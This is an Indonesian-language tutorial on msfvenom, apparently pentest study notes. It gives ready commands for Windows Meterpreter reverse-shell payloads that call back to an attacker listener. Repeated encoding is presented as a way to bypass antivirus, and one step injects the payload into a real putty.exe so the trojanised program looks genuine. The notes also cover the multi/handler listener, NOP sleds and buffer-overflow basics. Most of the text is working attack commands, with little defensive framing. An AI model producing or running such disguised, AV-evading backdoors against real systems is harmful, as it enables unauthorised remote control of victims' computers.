# Msfvenom

`msfvenom` digunakan untuk membuat payload dalam berbagai format, yang bisa dijalankan di target setelah exploit berhasil.

## ⚙️ Membuat Payload Dasar

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP-kita> LPORT=<PORT-kita> -f exe -o kebaikan.exe
```

Contoh:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=5555 -a x64 -e x64/zutto_dekiru -i 15 --platform windows -n 500 -f exe -o kebaikan.exe
```

### Keterangan Parameter

- `-p` : Pilih payload

- `LHOST` : IP listener kita

- `LPORT` : Port listener kita

- `-a` : Arsitektur (contoh: x64)

- `-e` : Encoder, untuk bypass antivirus

- `-i` : Iterasi encoder (semakin tinggi, semakin banyak encode)

- `-n` : Ukuran NOP sled

- `-f` : Format output file (contoh: exe, elf, apk, dll)

- `-o` : Output file

## 💣 Buffer Overflow

**Buffer Overflow** terjadi saat data melebihi kapasitas buffer di memori, sehingga menimpa bagian memori lain, termasuk instruksi program. Teknik ini bisa digunakan untuk mengeksekusi payload.

### NOP Sled Strategy

```
[ NOP sled ] + [ Payload ] + [ Return Address ]
```

NOP (`No Operation`) digunakan untuk memberi ruang "mendarat" ke payload jika alamat return tidak tepat.

[`Running a Buffer Overflow Attack - Computerphile`](https://youtu.be/1S0aBV-Waeo?si=JOZoMlj2EH8CtUSD)


## 📦 Daftar Encoder Tersedia

```bash
msfvenom --list encoders
```

## 🚀 Daftar Payloads Tersedia

Untuk melihat semua jenis payload yang tersedia di Metasploit, gunakan:

```bash
msfvenom --list payloads
```

Perintah ini akan menampilkan semua **payload** yang bisa kita gunakan dengan `msfvenom`.

Contoh payload:

- `windows/meterpreter/reverse_tcp`

- `linux/x86/shell_reverse_tcp`

- `android/meterpreter/reverse_http`

Gunakan payload yang sesuai dengan sistem target dan tujuan eksploitasi.

## 🧪 Payload dengan Template Binary (-x)

Agar payload tampak seperti program asli (misal: PuTTY), bisa gunakan `-x` untuk menyisipkan payload ke file executable asli.

### Contoh

1. Download `putty.exe`

2. Jalankan perintah:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP-kita> LPORT=<PORT> -x putty.exe -f exe -o Putty.exe
```

## 🎧 Setup Listener dengan Metasploit

```bash
use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST <IP>

set LPORT <PORT>

run
```

Kemudian jalankan file `Putty.exe` hasil payload tadi di target.



## 📚 Belajar


[`Metasploit - Msfvenom`](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)

[`OffSec - MSFvenom`](https://www.offsec.com/metasploit-unleashed/msfvenom/)